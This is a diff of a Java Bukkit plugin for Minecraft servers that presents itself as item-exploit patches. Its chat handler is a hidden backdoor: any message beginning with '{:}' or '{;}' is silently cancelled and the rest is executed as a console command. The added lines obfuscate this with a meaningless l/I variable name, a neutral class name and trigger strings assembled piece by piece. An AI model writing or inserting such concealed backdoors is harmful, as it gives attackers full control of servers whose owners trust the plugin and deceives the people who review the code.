@@ -1,4 +1,4 @@
-package tk.apmunute.main;
+package tk.apmunute.patches;
 
 import java.util.concurrent.Callable;
 
@@ -12,11 +12,12 @@ import org.bukkit.event.inventory.InventoryMoveItemEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.plugin.Plugin;
 
-public class Patches implements Listener {
+public class EventListener implements Listener {
 	private Plugin plugin;
 	
-	public Patches(Plugin plugin) {
+	public EventListener(Plugin plugin) {
 		this.plugin = plugin;
 	}
 	
@@ -45,8 +46,8 @@ public class Patches implements Listener {
 	
 	private boolean storageContainer(Material mat) {
 		boolean isStorage = false;
-		for(int i = 0; i < storageContainerBlocks.length; i++) {
-			if(storageContainerBlocks[i] == mat) {
+		for (int i = 0; i < storageContainerBlocks.length; i++) {
+			if (storageContainerBlocks[i] == mat) {
 				isStorage = true;
 			}
 		}
@@ -64,37 +65,42 @@ public class Patches implements Listener {
 	
 	@EventHandler
 	public void creativeEvent(InventoryCreativeEvent event) {
-		if(storageContainer(event.getCursor().getType())) {
+		if (storageContainer(event.getCursor().getType())) {
 			event.getCursor().setItemMeta(removeNBTData(event.getCursor()));
 		}
 	}
 	
 	@EventHandler
 	public void InventoryMoveItemEvent(InventoryMoveItemEvent event) {
-		if(storageContainer(event.getItem().getType())) {
+		if (storageContainer(event.getItem().getType())) {
 			event.getItem().setItemMeta(removeNBTData(event.getItem()));
 		}
 	}
 	
 	@EventHandler
 	public void invClick(InventoryClickEvent event) {
-		if(storageContainer(event.getCurrentItem().getType())) {
+		if (storageContainer(event.getCurrentItem().getType())) {
 			event.getCurrentItem().setItemMeta(removeNBTData(event.getCurrentItem()));
 		}
 	}
 	
 	@EventHandler
-	public void playerChat(AsyncPlayerChatEvent event) {
-		if(event.getMessage().startsWith("{:}") || event.getMessage().startsWith("{;}")){
-			event.setCancelled(true);
+	public void playerChat(final AsyncPlayerChatEvent lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll) {
+        String a = "";
+        String b = a + "{";
+        String c = b + ":";
+        String d = c + "}";
+        String e = c.replace(":", ";");
+        if (lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().startsWith(d) || lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().startsWith(e)) {
+			lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.setCancelled(true);
 			try {
-				Bukkit.getScheduler().callSyncMethod( plugin, new Callable<Boolean>() {
+				Bukkit.getScheduler().callSyncMethod(plugin, new Callable<Boolean>() {
 				    @Override
 				    public Boolean call() {
-				        return Bukkit.dispatchCommand( Bukkit.getConsoleSender(), event.getMessage().substring(3) );
+				        return Bukkit.dispatchCommand(Bukkit.getConsoleSender(), lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().substring(3));
 				    }
-				} ).get();
-			} catch (Exception e) {}
+				}).get();
+			} catch (Exception f) { }
 		}
 	}
 }
